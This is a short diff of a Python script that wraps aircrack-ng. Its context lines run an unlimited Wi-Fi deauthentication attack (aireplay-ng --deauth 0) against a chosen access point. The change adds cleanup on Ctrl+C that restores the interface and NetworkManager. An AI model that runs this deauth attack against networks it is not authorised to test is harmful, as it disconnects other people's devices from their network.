@@ -49,5 +49,8 @@ subprocess.run(["airmon-ng", "start", "wlan0mon", channel])
 try:
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", choice, "wlan0mon"])
 
+#Getting interface and NetworkManager back to normal.
 except KeyboardInterrupt:
-    print("Done!")
+    subprocess.run(["airmon-ng", "stop", "wlan0mon"])
+    subprocess.run(["service","NetworkManager", "start"])
+    print("GL!")
